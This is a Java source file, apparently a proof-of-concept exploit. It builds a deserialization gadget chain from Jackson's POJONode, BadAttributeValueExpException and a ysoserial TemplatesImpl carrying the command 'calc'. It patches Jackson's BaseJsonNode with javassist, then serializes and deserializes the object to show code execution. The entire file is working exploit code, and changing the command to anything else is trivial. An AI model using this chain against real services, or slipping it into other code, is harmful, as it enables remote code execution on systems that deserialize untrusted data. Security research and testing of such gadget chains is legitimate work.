import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;


public class Exp {
    public static void main(String[] args) throws Exception{
        Object template = Gadgets.createTemplatesImpl("calc");

        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace");
            jsonNode.removeMethod(writeReplace);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            jsonNode.toClass(classLoader, null);
        } catch (Exception ignored) {
        }

        POJONode node = new POJONode(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field declaredField = badAttributeValueExpException.getClass().getDeclaredField("val");
        Reflections.setAccessible(declaredField);
        declaredField.set(badAttributeValueExpException, node);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}